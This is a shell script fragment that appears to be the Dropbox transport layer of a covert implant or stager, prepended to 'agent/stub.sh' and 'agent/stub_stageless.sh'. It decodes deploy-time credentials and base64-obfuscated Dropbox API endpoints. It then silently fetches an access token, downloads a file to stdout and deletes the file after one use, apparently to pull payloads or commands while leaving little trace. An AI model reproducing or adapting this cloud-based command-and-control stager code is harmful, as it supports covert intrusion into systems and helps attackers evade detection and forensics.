# === TRANSPORT: Dropbox (stub layer) ===
# Provides _tk (get token), _dl (download), _rm (delete).
# Credentials substituted by wizard at deploy time.
# This file is prepended to agent/stub.sh and agent/stub_stageless.sh.

_a=$(printf '%s' 'STUB_APP_KEY_B64' | base64 -d 2>/dev/null)
_b=$(printf '%s' 'STUB_APP_SECRET_B64' | base64 -d 2>/dev/null)
_c=$(printf '%s' 'STUB_REFRESH_TOKEN_B64' | base64 -d 2>/dev/null)

# -- get access token --
_tk() {
    _u=$(printf '%s' 'aHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vb2F1dGgyL3Rva2Vu' | base64 -d)
    curl -sf -X POST "$_u" \
        -d "grant_type=refresh_token&refresh_token=${_c}&client_id=${_a}&client_secret=${_b}" \
        2>/dev/null | grep -o '"access_token": *"[^"]*"' | grep -o '"[^"]*"$' | tr -d '"'
}

# -- download file to stdout --
_dl() {
    _u=$(printf '%s' 'aHR0cHM6Ly9jb250ZW50LmRyb3Bib3hhcGkuY29tLzIvZmlsZXMvZG93bmxvYWQ=' | base64 -d)
    curl -sf -X POST "$_u" \
        -H "Authorization: Bearer ${1}" \
        -H "Dropbox-API-Arg: {\"path\":\"${2}\"}" 2>/dev/null
}

# -- delete file (BK one-time use) --
_rm() {
    _u=$(printf '%s' 'aHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vMi9maWxlcy9kZWxldGVfdjI=' | base64 -d)
    curl -sf -X POST "$_u" \
        -H "Authorization: Bearer ${1}" \
        -H "Content-Type: application/json" \
        --data "{\"path\":\"${2}\"}" >/dev/null 2>&1
}

